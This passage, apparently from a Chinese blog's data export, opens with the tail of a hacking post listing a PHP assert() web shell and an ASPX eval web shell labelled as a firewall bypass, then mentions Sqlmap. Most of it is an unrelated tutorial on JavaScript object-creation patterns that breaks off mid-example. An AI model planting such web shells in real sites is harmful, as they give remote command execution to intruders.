plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n"},{"title":"JavaScript创建对象的七种模式","date":"2016-10-11T12:16:14.000Z","_content":"\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span 